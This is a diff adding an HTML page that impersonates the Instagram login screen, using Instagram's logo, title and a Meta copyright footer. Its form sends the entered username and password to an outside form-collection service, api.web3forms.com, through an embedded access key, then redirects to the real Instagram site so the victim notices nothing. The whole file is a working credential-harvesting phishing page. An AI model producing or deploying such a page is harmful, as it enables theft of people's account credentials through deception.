@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="/Instagram_icon.png.webp" />
+ 
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" alt="Instagram Logo" />
+    <h1>Instagram</h1>
+
+    <form action="https://api.web3forms.com/submit" method="POST" id="practiceForm">
+      <input type="hidden" name="access_key" value="31395a88-5dba-492a-a53c-b983e34e9d43" />
+      <input type="text" name="username" id="username" placeholder="Enter your username" required />
+      <input type="password" name="mdps" id="password" placeholder="Enter your password" required />
+      <input type="checkbox" name="botcheck" class="hidden" style="display: none;" />
+      <input type="hidden" name="redirect" value="https://www.instagram.com/" />
+
+      <button type="submit" id="submitBtn">Submit</button>
+      <div id="spinner"><div class="loader"></div></div>
+    </form>
+
+    <p class="footer">© 2025 Instagram from Meta</p>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
